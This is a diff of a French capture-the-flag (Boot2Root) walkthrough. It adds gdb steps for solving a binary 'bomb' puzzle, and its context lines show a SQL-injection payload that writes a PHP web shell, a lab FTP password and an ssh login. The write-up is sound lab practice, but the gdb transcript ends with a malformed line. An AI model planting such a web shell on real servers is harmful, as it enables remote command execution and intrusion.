@@ -29,6 +29,8 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
 lmezard:G!@M6f4Eatau{sF"
 ```
+
+# Lmezard FTP
 - On peut se connecter au FTP grace a ces login
 - On recupere les fichiers
 - On remarque que le fichier fun est une archive de plusieurs fichiers donc on le decompresse avec `tar -xf fun`
@@ -60,6 +62,7 @@ Now SHA-256 it and submit%
 ssh laurie@192.168.1.97
 ```
 
+## Laurie
 - Un fichier README se trouve dans le home de laurie: 
 
 ```
@@ -82,6 +85,23 @@ NO SPACE IN THE PASSWORD (password is case sensitive).
 Nous le decompilons avec binary ninja.
 
 ### Phase 1:
-Nous pouvons reporté la string depuis binary ninja: `Public speaking is very easy.`
+- Nous pouvons reporté la string depuis binary ninja: `Public speaking is very easy.`
 
 ### Phase 2:
+- Avec binary ninja on sait que le premier chiffre est 1
+- Pour les suivant on utilise gdb
+- On break a la comparaison et on print $eax se qui nous donne le nouveau chiffre
+<pre>
+[alarmv@alarm scripts]$ gdb ./bomb 
+gdb-peda$ b *0x8048b7e
+Breakpoint 1 at 0x8048b7e
+gdb-peda$ r
+Starting program: /home/alarm/Boot2Root/scripts/bomb 
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Public speaking is very easy.
+Phase 1 defused. How about the next one?
+1 15 15 15 15 15
+gdb-peda$ x $eax
+0x2:    Cannot access memory at address </pre0x2
+</pre>
